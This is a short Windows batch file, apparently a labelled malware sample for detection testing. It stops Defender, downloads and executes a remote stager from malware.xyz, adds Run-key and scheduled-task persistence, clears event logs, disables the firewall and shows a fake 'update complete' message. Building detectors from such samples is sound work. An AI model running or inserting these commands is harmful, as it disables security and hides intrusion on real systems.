@echo off
REM MALWARE PATTERN: Batch file with hidden execution and privilege escalation

REM Hide the window
start /b /min "" cmd.exe

REM SUSPICIOUS: Disable security tools
net stop "Windows Defender"
net stop "Windows Update"
taskkill /F /IM svchost.exe

REM SUSPICIOUS: Download and execute from remote server
powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://malware.xyz/stager.ps1')"

REM SUSPICIOUS: Registry manipulation to persist
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "System Update" /t REG_SZ /d "%CD%\system.exe" /f

REM SUSPICIOUS: Delete Windows Event logs to cover tracks
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

REM SUSPICIOUS: Modify firewall rules
netsh advfirewall set allprofiles state off

REM SUSPICIOUS: Create scheduled task for persistence
schtasks /create /tn "Windows Maintenance" /tr "%CD%\malware.exe" /sc daily /st 12:00 /f

REM SUSPICIOUS: Attempt to bypass UAC
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\cmd.exe" /v "Path" /t REG_SZ /d "%CD%\shell.exe" /f

echo System update complete
pause
